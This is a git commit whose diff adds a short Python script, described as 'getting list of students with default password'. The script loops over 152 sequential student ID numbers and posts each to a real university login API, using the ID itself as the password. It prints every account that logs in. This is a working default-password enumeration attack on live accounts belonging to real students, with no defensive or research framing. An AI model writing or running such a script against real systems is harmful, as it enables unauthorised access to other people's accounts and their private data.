368f319304b174c81d6d15e27fa7263809d444ec
azarovalex <alex@azarov.by>
2018-01-16 01:27:43 +0300

    Getting list of students with default password.

--- app.py
+++ app.py
@@ -3,6 +3,15 @@ import numpy as np
 import pandas as pd  
 import time          
 
-page_link = 'http://iis.bsuir.by/#/login'
-response = requests.get(page_link)
-print(response)
+initial_studak_numer = 6510001
+num_of_students = 152
+login_url = "https://students.bsuir.by/api/v1/auth/login"
+headers = {"Content-Type": "application/json"}
+
+for studak in range(initial_studak_numer, initial_studak_numer + num_of_students):
+	json = {"username": str(studak), "password": str(studak)}
+	# print(json)
+	r = requests.post(login_url, headers=headers ,json=json)
+	time.sleep(1)
+	if r.json()['loggedIn']:
+		print(studak)
